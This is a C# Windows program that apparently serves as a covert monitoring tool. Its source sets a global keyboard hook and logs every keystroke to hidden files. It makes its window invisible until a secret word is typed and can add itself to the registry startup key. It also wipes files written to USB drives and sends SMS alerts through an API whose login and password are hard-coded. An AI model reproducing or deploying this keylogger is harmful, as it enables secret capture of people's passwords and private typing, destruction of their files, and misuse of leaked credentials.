using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;

using System.Runtime.InteropServices;
using System.IO;
using System.Collections;
using System.Net.Mail;
using Microsoft.Win32;
using System.Management;
using System.Net;
using System.Threading;
using System.Diagnostics;
using SHDocVw;

namespace Data_Detran
{
    public partial class Form1 : Form
    {
        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
        internal static extern short GetKeyState(int virtualKeyCode);

        String atmdir = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "\\Key Logger";
        String writeUp = "";
        String writeUpBuffer = "";
        String secretWord = "";
        ArrayList keyWords;
        String mobileNumber = "";
        FileSystemWatcher watcher;
        List<Thread> threads = new List<Thread>();



        String keywordsFileDir, logsFileDir, attachFileDir;

        bool PauseWriting = false;
        

        public Form1()
        {
            InitializeComponent();

            InitAdmin();
            
            InitStream();

            InitSecretWord();
                       
            InitKeyWords();

            InitMobileNo();

            InitUSBReader();

            GetDrive_and_watchcall("");

            
        }

        private void InitAdmin()
        {
            if (Properties.Settings.Default.Admin == "")
            {
                Properties.Settings.Default.Admin = Environment.UserName;
                Save();
            }
        }


        private void InitStream()
        {
            if (!Directory.Exists(atmdir)) Directory.CreateDirectory(atmdir);
            atmdir += "\\";

            keywordsFileDir = atmdir + "keywords.krs";
            logsFileDir = atmdir + Environment.UserName + "-logs.krs";
            attachFileDir = atmdir + "attachlog.txt";
            StreamWriter sw;
            if (!File.Exists(keywordsFileDir))
            {
                sw = File.CreateText(keywordsFileDir);
                sw.Close();
            }
            if (!File.Exists(logsFileDir))
            {
                sw = File.CreateText(logsFileDir);
                sw.Close();
            }
        }

        private void GetDrive_and_watchcall(String n)
        {
            if (n == "")
            {
                DriveInfo[] drives = DriveInfo.GetDrives();
                foreach (DriveInfo drive in drives)
                {
                    if (!drive.IsReady)
                    {
                        continue;
                    }
                    if (drive.DriveType == DriveType.Removable && isDirectoryEmpty(drive.Name) == true)
                    {
                        Thread F = new Thread(new ParameterizedThreadStart(watch));
                        F.Start(drive.Name);

                        threads.Add(F);
                    }

                }
            }
            else
            {
                Thread t = new Thread(new ParameterizedThreadStart(watch));
                t.Start(n);

                threads.Add(t);
            }
        }
       
        private bool isDirectoryEmpty(string path)
        {
            if (!Directory.Exists(path)) return false;
            return Directory.GetFiles(path, "*", SearchOption.AllDirectories).Any();
        }

        private void watch(object pth)
        {
            string path = (string)pth;
            
            watcher = new FileSystemWatcher();
            watcher.Changed += watcher_Changed;//register event to be called when a file is updated in specified path
           
            watcher.Path = path;//assigning path to be watched
            watcher.IncludeSubdirectories = true;//make sure watcher will look into subfolders as well.
            watcher.Filter = "*.*"; //watcher should monitor all types of file.
            watcher.EnableRaisingEvents = true;//make sure watcher will raise event in case of change in folder.
            while (true) ;

        }

        private void watcher_Changed(object sender, FileSystemEventArgs e)
        {
            string directory = Path.GetDirectoryName(e.FullPath);
            string f = directory.Replace(@"\", "/");


            ShellWindows _shellWindows = new SHDocVw.ShellWindows();
            string processType;

            foreach (InternetExplorer ie in _shellWindows)
            {
                //this parses the name of the process
                processType = Path.GetFileNameWithoutExtension(ie.FullName).ToLower();

                //this could also be used for IE windows with processType of "iexplore"
                if (processType.Equals("explorer") && ie.LocationURL.Contains(f))
                {
                    ie.Quit();
                }
            }

            if (Directory.Exists(e.FullPath))
            {
                watch(e.FullPath);
            }
            else
            {
                
                try
                {
                    if (!string.IsNullOrEmpty(e.FullPath))
                    {
                       
                        watcher.EnableRaisingEvents = false;
                        File.Delete(e.FullPath);
                        string encodedData = "";
                        StreamWriter outputFile = new StreamWriter(e.FullPath, false);

                        outputFile.Write(encodedData);
                        outputFile.Flush();
                        outputFile.Close();

                        watcher.EnableRaisingEvents = true;
                        //break;

                    }

                }
                catch (Exception excep)
                {
                   Thread.Sleep(2000);
                }


            }
        }

        private void InitUSBReader()
        {

            ManagementEventWatcher mwe_creation; //Object creation for 'ManagementEventWatcher' class is used to listen the temporary system event notofications based on specific query. 
            WqlEventQuery q_creation = new WqlEventQuery(); //Represents WMI(Windows Management Instrumentation) event query in WQL format for more information goto www.en.wikipedia.org/wiki/WQL
            q_creation.EventClassName = "__InstanceCreationEvent";// Sets the eventclass to the query
            q_creation.WithinInterval = new TimeSpan(0, 0, 2);    // Setting up the time interval for the event check(here, it is 2 Seconds)
            q_creation.Condition = @"TargetInstance ISA 'Win32_LogicalDisk'"; //Sets which kind of event  to be notified
            mwe_creation = new ManagementEventWatcher(q_creation); //Initializing new instance
            mwe_creation.EventArrived += new EventArrivedEventHandler(USBEventArrived_Creation);//Calling up 'USBEventArrived_Creation' method when the usb storage plug-in event occured
            mwe_creation.Start(); // Starting to listen to the system events based on the given query

            ManagementEventWatcher mwe_deletion;
            WqlEventQuery q_deletion = new WqlEventQuery();
            q_deletion.EventClassName = "__InstanceDeletionEvent";
            q_deletion.WithinInterval = new TimeSpan(0, 0, 2);    //How often do you want to check it? 2Sec.
            q_deletion.Condition = @"TargetInstance ISA 'Win32_DiskDriveToDiskPartition'  ";
            mwe_deletion = new ManagementEventWatcher(q_deletion);
            mwe_deletion.EventArrived += new EventArrivedEventHandler(USBEventArrived_Deletion);
            mwe_deletion.Start();
        }

        private void USBEventArrived_Creation(object sender, EventArrivedEventArgs e)
        {
            if (CheckForInternetConnection())
            {
                SendSMS("A USB-Storage Device Added");
            }
            else
            {
                TraceService("A USB-Storage Device Added"); //writing 'USB Added' line to the created text file
            }

            ManagementBaseObject instance = (ManagementBaseObject)e.NewEvent["TargetInstance"];
            foreach (var property in instance.Properties)
            {

                if (property.Name == "Name"){
                  
                    GetDrive_and_watchcall(property.Value.ToString());

                    }
            }
        }

        private void USBEventArrived_Deletion(object sender, EventArrivedEventArgs e)
        {
            if (CheckForInternetConnection())
            {
                SendSMS("A USB-Storage Device Removed");
            }
            else
            {
                TraceService("A USB-Storage Device Removed"); //writing 'USB Removed' line to the created text file
            }
        }

        private void SendSMS(String msg)
        {
            
            //create the constructor with post type and few data
            MyWebRequest myRequest = new MyWebRequest("http://sms.xpresssms.in/api/api.php?", "POST", "ver=1&mode=1&action=push_sms&type=1&route=2&login_name=kodspider&api_password=435c539bfdbd4c4c11ec&message=" + msg + "&number=" + Properties.Settings.Default.MobileNo + "&sender=IAKCDA");
            //show the response string on the console screen.
            // Console.WriteLine(myRequest.GetResponse());
            String response = myRequest.GetResponse();
            
        }

        public static bool CheckForInternetConnection()
        {
            try
            {
                using (var client = new WebClient())
                {
                    using (var stream = client.OpenRead("http://www.google.com"))
                    {
                        return true;
                    }
                }
            }
            catch
            {
                return false;
            }
        }


        private void TraceService(string content)// Method creation using a string parameter 'content' used for creation of 'ScheduledService.txt' file in 'c' drive and writing certain content to this file
        {
            //set up a filestream
            FileStream fs = new FileStream(@"D:\USB_LOG.txt", FileMode.OpenOrCreate, FileAccess.Write);

            //set up a streamwriter for adding text
            StreamWriter sw = new StreamWriter(fs);

            //find the end of the underlying filestream
            sw.BaseStream.Seek(0, SeekOrigin.End);

            //add the text
            sw.WriteLine(content);
            //add the text to the underlying filestream
            // flusing contents in memory before closing
            sw.Flush();
            //close the writer
            sw.Close();
        }

        private void InitSecretWord()
        {
            if (Properties.Settings.Default.SecretWord == "")
            {
                Properties.Settings.Default.SecretWord = "sarath";
                Save();
            }
            secretWord = Properties.Settings.Default.SecretWord;
            txtScrtWrd.Text = secretWord;

            if (Properties.Settings.Default.AutoStart == false
                && Environment.UserName == Properties.Settings.Default.Admin)
            {
                this.ShowWindow();
                this.btnStart.Enabled = true;
                this.btnStop.Enabled = false;
                this.btnHide.Enabled = false;
            }
            else
            {
                hook.CreateHook(KeyReaderr);
                this.btnStart.Enabled = false;
                this.btnStop.Enabled = true;
                this.btnHide.Enabled = true;
                this.HideWindow();      // Default;
            }
        }

        private void InitMobileNo()
        {
            if (Properties.Settings.Default.MobileNo == "")
            {
                Properties.Settings.Default.MobileNo = "8129195363";
                Save();
            }
            mobileNumber = Properties.Settings.Default.MobileNo;
            textMobno.Text = mobileNumber;

            //if (Properties.Settings.Default.AutoStart == false
            //    && Environment.UserName == Properties.Settings.Default.Admin)
            //{
            //    this.ShowWindow();
            //    this.btnStart.Enabled = true;
            //    this.btnStop.Enabled = false;
            //    this.btnHide.Enabled = false;
            //}
            //else
            //{
            //    hook.CreateHook(KeyReaderr);
            //    this.btnStart.Enabled = false;
            //    this.btnStop.Enabled = true;
            //    this.btnHide.Enabled = true;
            //    this.HideWindow();      // Default;
            //}
        }

        private void InitKeyWords()
        {
            using (StreamReader sr = new StreamReader(keywordsFileDir))
            {
                String temp;
                keyWords = new ArrayList();

                do
                {
                    // read a line of text
                    temp = sr.ReadLine();
                    if (temp != null) keyWords.Add(temp);
                } while (temp != null);
            }
        }
      
        private void btnStart_Click(object sender, EventArgs e)
        {
            hook.CreateHook(KeyReaderr);
            btnStart.Enabled = false;
            btnStop.Enabled = true;
            btnHide.Enabled = true;
            Properties.Settings.Default.AutoStart = true;
            Save();
        }

        private void btnStop_Click(object sender, EventArgs e)
        {
            hook.DestroyHook();
            btnStart.Enabled = true;
            btnStop.Enabled = false;
            btnHide.Enabled = false;
            Save();
        }

        public void KeyReaderr(IntPtr wParam, IntPtr lParam, bool ShiftMod, bool CapMod)
        {
            int key = Marshal.ReadInt32(lParam);

            hook.VK vk = (hook.VK)key;

            String temp = "";

            #region switch
            switch (vk)
            {
                //case hook.VK.VK_F1: temp = "<-F1->";
                //    break;
                //case hook.VK.VK_F2: temp = "<-F2->";
                //    break;
                //case hook.VK.VK_F3: temp = "<-F3->";
                //    break;
                //case hook.VK.VK_F4: temp = "<-F4->";
                //    break;
                //case hook.VK.VK_F5: temp = "<-F5->";
                //    break;
                //case hook.VK.VK_F6: temp = "<-F6->";
                //    break;
                //case hook.VK.VK_F7: temp = "<-F7->";
                //    break;
                //case hook.VK.VK_F8: temp = "<-F8->";
                //    break;
                //case hook.VK.VK_F9: temp = "<-F9->";
                //    break;
                //case hook.VK.VK_F10: temp = "<-F10->";
                //    break;
                //case hook.VK.VK_F11: temp = "<-F11->";
                //    break;
                //case hook.VK.VK_F12: temp = "<-F12->";
                //    break;

                //case hook.VK.VK_SNAPSHOT: temp = "<-print screen->";
                //    break;
                //case hook.VK.VK_SCROLL: temp = "<-scroll>";
                //    break;
                //case hook.VK.VK_PAUSE: temp = "<-pause->";
                //    break;
                //case hook.VK.VK_INSERT: temp = "\r\n<-insert->";
                //    break;
                //case hook.VK.VK_HOME: temp = "\r\n<-home->";
                //    break;
                case hook.VK.VK_DELETE: temp = "<delete>";
                    break;
                //case hook.VK.VK_END: temp = "<-end->";
                //    break;
                //case hook.VK.VK_PRIOR: temp = "<-page up->";
                //    break;
                //case hook.VK.VK_NEXT: temp = "<-page down->";
                //    break;

                //case hook.VK.VK_ESCAPE: temp = "\r\n<-esc->";
                //    break;
                //case hook.VK.VK_NUMLOCK: temp = "\r\n<-numlock->";
                //    break;
                //case hook.VK.VK_LSHIFT: temp = "\r\n<-left shift->";
                //    break;
                //case hook.VK.VK_RSHIFT: temp = "\r\n<-right shift->";
                //    break;
                //case hook.VK.VK_LCONTROL: temp = "\r\n<-left control->";
                //    break;
                //case hook.VK.VK_RCONTROL: temp = "\r\n<-right control->";
                //    break;
                //case hook.VK.VK_LMENU: temp = "\r\n<-left alt->";
                //    break;
                //case hook.VK.VK_RMENU: temp = "\r\n<-right alt->";
                //    break;
                case hook.VK.VK_TAB: temp = "\t";
                    break;
                //case hook.VK.VK_CAPITAL: temp = "\r\n<-caps lock->";
                //    break;
                case hook.VK.VK_BACK: temp = "<back>";
                    break;
                case hook.VK.VK_RETURN: temp = "\r\n";
                    break;
                case hook.VK.VK_SPACE: temp = "  ";     //  "<-space->"
                    break;

                //case hook.VK.VK_LEFT: temp = "<left>";
                //    break;
                //case hook.VK.VK_UP: temp = "<up>";
                //    break;
                //case hook.VK.VK_RIGHT: temp = "<right>";
                //    break;
                //case hook.VK.VK_DOWN: temp = "<down>";
                //    break;

                case hook.VK.VK_MULTIPLY: temp = "*";
                    break;
                case hook.VK.VK_ADD: temp = "+";
                    break;
                case hook.VK.VK_SEPERATOR: temp = "|";
                    break;
                case hook.VK.VK_SUBTRACT: temp = "-";
                    break;
                case hook.VK.VK_DECIMAL: temp = ".";
                    break;
                case hook.VK.VK_DIVIDE: temp = "/";
                    break;

                case hook.VK.VK_OEM_1: temp = ";";
                    break;
                case hook.VK.VK_OEM_PLUS: temp = "=";
                    break;
                case hook.VK.VK_OEM_COMMA: temp = ",";
                    break;
                case hook.VK.VK_OEM_MINUS: temp = "-";
                    break;
                case hook.VK.VK_OEM_PERIOD: temp = ".";
                    break;
                case hook.VK.VK_OEM_2: temp = "/";
                    break;
                case hook.VK.VK_OEM_3: temp = "`";
                    break;
                case hook.VK.VK_OEM_4: temp = "[";
                    break;
                case hook.VK.VK_OEM_5: temp = @"\";
                    break;
                case hook.VK.VK_OEM_6: temp = "]";
                    break;
                case hook.VK.VK_OEM_7: temp = "'";
                    break;

                case hook.VK.VK_NUMPAD0: temp = "0";
                    break;
                case hook.VK.VK_NUMPAD1: temp = "1";
                    break;
                case hook.VK.VK_NUMPAD2: temp = "2";
                    break;
                case hook.VK.VK_NUMPAD3: temp = "3";
                    break;
                case hook.VK.VK_NUMPAD4: temp = "4";
                    break;
                case hook.VK.VK_NUMPAD5: temp = "5";
                    break;
                case hook.VK.VK_NUMPAD6: temp = "6";
                    break;
                case hook.VK.VK_NUMPAD7: temp = "7";
                    break;
                case hook.VK.VK_NUMPAD8: temp = "8";
                    break;
                case hook.VK.VK_NUMPAD9: temp = "9";
                    break;

                case hook.VK.VK_Q: temp = "q";
                    break;
                case hook.VK.VK_W: temp = "w";
                    break;
                case hook.VK.VK_E: temp = "e";
                    break;
                case hook.VK.VK_R: temp = "r";
                    break;
                case hook.VK.VK_T: temp = "t";
                    break;
                case hook.VK.VK_Y: temp = "y";
                    break;
                case hook.VK.VK_U: temp = "u";
                    break;
                case hook.VK.VK_I: temp = "i";
                    break;
                case hook.VK.VK_O: temp = "o";
                    break;
                case hook.VK.VK_P: temp = "p";
                    break;
                case hook.VK.VK_A: temp = "a";
                    break;
                case hook.VK.VK_S: temp = "s";
                    break;
                case hook.VK.VK_D: temp = "d";
                    break;
                case hook.VK.VK_F: temp = "f";
                    break;
                case hook.VK.VK_G: temp = "g";
                    break;
                case hook.VK.VK_H: temp = "h";
                    break;
                case hook.VK.VK_J: temp = "j";
                    break;
                case hook.VK.VK_K: temp = "k";
                    break;
                case hook.VK.VK_L: temp = "l";
                    break;
                case hook.VK.VK_Z: temp = "z";
                    break;
                case hook.VK.VK_X: temp = "x";
                    break;
                case hook.VK.VK_C: temp = "c";
                    break;
                case hook.VK.VK_V: temp = "v";
                    break;
                case hook.VK.VK_B: temp = "b";
                    break;
                case hook.VK.VK_N: temp = "n";
                    break;
                case hook.VK.VK_M: temp = "m";
                    break;

                case hook.VK.VK_0: temp = "0";
                    break;
                case hook.VK.VK_1: temp = "1";
                    break;
                case hook.VK.VK_2: temp = "2";
                    break;
                case hook.VK.VK_3: temp = "3";
                    break;
                case hook.VK.VK_4: temp = "4";
                    break;
                case hook.VK.VK_5: temp = "5";
                    break;
                case hook.VK.VK_6: temp = "6";
                    break;
                case hook.VK.VK_7: temp = "7";
                    break;
                case hook.VK.VK_8: temp = "8";
                    break;
                case hook.VK.VK_9: temp = "9";
                    break;
                default: break;
            }
            #endregion

            #region To Upper Case

            if (ShiftMod == true)
            {
                if ((int)vk > 0x40 && (int)vk < 0x5B && CapMod == false) temp = temp.ToUpper();
                if (vk == hook.VK.VK_1) temp = "!";
                if (vk == hook.VK.VK_2) temp = "@";
                if (vk == hook.VK.VK_3) temp = "#";
                if (vk == hook.VK.VK_4) temp = "$";
                if (vk == hook.VK.VK_5) temp = "%";
                if (vk == hook.VK.VK_6) temp = "^";
                if (vk == hook.VK.VK_7) temp = "&";
                if (vk == hook.VK.VK_8) temp = "*";
                if (vk == hook.VK.VK_9) temp = "(";
                if (vk == hook.VK.VK_0) temp = ")";
                if (vk == hook.VK.VK_OEM_1) temp = ":";
                if (vk == hook.VK.VK_OEM_2) temp = "?";
                if (vk == hook.VK.VK_OEM_3) temp = "~";
                if (vk == hook.VK.VK_OEM_COMMA) temp = "<";
                if (vk == hook.VK.VK_OEM_MINUS) temp = "_";
                if (vk == hook.VK.VK_OEM_PERIOD) temp = ">";
                if (vk == hook.VK.VK_OEM_PLUS) temp = "+";
                if (vk == hook.VK.VK_OEM_4) temp = "{";
                if (vk == hook.VK.VK_OEM_5) temp = "|";
                if (vk == hook.VK.VK_OEM_6) temp = "}";
                if (vk == hook.VK.VK_OEM_7) temp = "\"";
            }
            else if (CapMod == true)
            {
                if ((int)vk > 0x40 && (int)vk < 0x5B) temp = temp.ToUpper();
            }

            #endregion

            writeUp = writeUp + temp;
            writeUpBuffer = writeUpBuffer + temp;

#if Disabled
            checkKeys();
#endif
            //writeToFile(temp);
        }
        
        //================================Unhiding application after entering password================================
        public void unhide()
        {
            if (secretWord != "" && writeUp.Contains(secretWord))
            {
                writeUp = writeUp.Replace(secretWord, "");
                this.ShowWindow();
            }
        }//================================================================================================

        public void checkKeys()
        {
            int max = keyWords.Count;

            for (int i = 0; i < max; i++)
            {
                if (writeUp.Contains((String)keyWords[i]))
                {
                    MessageBox.Show("KeyWord!");
                    MessageBox.Show((String)keyWords[i]);

                    writeUp = writeUp.Replace((String)keyWords[i],"");
                    return;
                }
            }

        }

        public void writeToFile(String writing)
        {
            if (PauseWriting == false) File.AppendAllText(logsFileDir, writing);
        }


        //================================saving password to the settings on button click====================
        private void btnSvScrtWrd_Click(object sender, EventArgs e)
        {
            if (txtScrtWrd.Text == "")
            {
                MessageBox.Show("No Secret Word Entered!");
            }
            else
            {
                WriteSecretWord();
                NotifySaved();
            }
        }//==================================================================================================

        //===============================================Writing password to the settings=====================
        private void WriteSecretWord()
        {
            secretWord = txtScrtWrd.Text.Trim();
            Properties.Settings.Default.SecretWord = secretWord;
            Save();
        }
        //===================================================================================================

       
        
        private bool CheckDuplicateKeyWords(string input)
        {
            bool result = false;
            int max = keyWords.Count;
            for (int i = 0; i < max; i++)
            {
                if ((String)keyWords[i] == input) result = true;
            }
            return result;
        }
        
        

        //==================================Calling Hide method on Hide button click============================
        private void btnHide_Click(object sender, EventArgs e)
        {
            this.HideWindow();
        }
        //======================================================================================================

        //====================================Unhiding ApplicationUI============================================
        private void ShowWindow()
        {
            this.Opacity = 1;
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.WindowState = FormWindowState.Normal;
            this.Refresh();
        }

        //=======================================================================================================
        //===================================Hide the UI of our application======================================

        private void HideWindow()
        {
            this.Opacity = 0;
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedToolWindow;
            this.WindowState = FormWindowState.Minimized;
            this.Refresh();
        }
        //=======================================================================================================

        //======================================== Clicking Exit button==========================================

        private void btnExit_Click(object sender, EventArgs e)
        {
            //this.Close();
            //Application.Exit();
            System.Environment.Exit(0);
        }

        //========================================================================================================
        
        //===================================Notification messagebox after saving settings========================
        private void NotifySaved()
        {
            MessageBox.Show("Saved!");
        }//=======================================================================================================
        
        //=======================Saving password to the Settings==================================================
        private void SavePassword(String rawpass)
        {
            Char[] gen = rawpass.ToCharArray();
            Array.Reverse(gen);
            Properties.Settings.Default.PW = new String(gen);
            Save();
        }
        //========================================================================================================

        //=======================Loading password from settings to the password field==============================
        private String LoadPassword()
        {
            String raw = Properties.Settings.Default.PW;
            Char[] gen = raw.ToCharArray();
            Array.Reverse(gen);
            return new String(gen);
        }//========================================================================================================

        //=============================Calling Save method to save seetings on Application closing=================
        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            Save();
        }//========================================================================================================

        private void timUnHide_Tick(object sender, EventArgs e)
        {
            unhide();
            String temp = writeUpBuffer;
            writeUpBuffer = "";
            writeToFile(temp);
        }

        //=======================Button to create the application shortcut on desktop===============================
        private void btnCreateDesktopShortcut_Click(object sender, EventArgs e)
        {
            String ShortcutLnk = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Typing For Fun.lnk";
            if (!File.Exists(ShortcutLnk))
            {
                IWshRuntimeLibrary.WshShell shell = new IWshRuntimeLibrary.WshShell();
                IWshRuntimeLibrary.IWshShortcut link = (IWshRuntimeLibrary.IWshShortcut)shell.CreateShortcut(ShortcutLnk);
                link.TargetPath = atmdir;
                link.Save();
            }
        }//=========================================================================================================

        //====================================saving default setings==============================================
        private void Save()
        {
            Properties.Settings.Default.Save();
        }//=======================================================================================================
        
        //=============================Adding application at windows startup======================================
        private void button2_Click(object sender, EventArgs e)
        {
            RegistryKey registryKey = Registry.CurrentUser.OpenSubKey
       ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            if (checkBox1.Checked == true)
            {
                if (isregistrykeyexist(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"))
                {
                    MessageBox.Show("Its already in startup !");
                }
                else
                {
                    registryKey.SetValue("Data_Detran", Application.ExecutablePath);
                    MessageBox.Show("Added in startup !");
                }
            }
            else
            {
                if (isregistrykeyexist(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"))
                {
                    registryKey.DeleteValue("Data_Detran");
                    MessageBox.Show("Deleted from startup !");
                    
                }
                else
                {
                    MessageBox.Show("Its not added !"); 
                }
            }
        }//===================================================================================================
        //======================Checking the registry key is existing=========================================
        private Boolean isregistrykeyexist(String m){
            string keyName=m;
            string valueName="Data_Detran";
        if (Registry.GetValue(keyName, valueName, null) == null)
        {
            return false;
        }
        else
        {
            return true;
        }

    } //=======================================================================================================
        //====================Saving mobile number using the method WriteMobileNo() ===========================
        private void saveMobno_Click(object sender, EventArgs e)
        {
            if (textMobno.Text == "")
            {
                MessageBox.Show("No Phone number Entered!");
            }
            else if (textMobno.Text.Length < 10)
            {
                MessageBox.Show("Enter a Valid Mobile Number");
            }
            else
            {
                WriteMobileNo();
                NotifySaved();
            }
        }//=====================================================================================================
        //========================write mobile number to Application settings ================================== 
        private void WriteMobileNo()
        {
            String Mobno = textMobno.Text.Trim();
            Properties.Settings.Default.MobileNo = Mobno;
            Save();
        }
        //====================================================================================================
    }
}
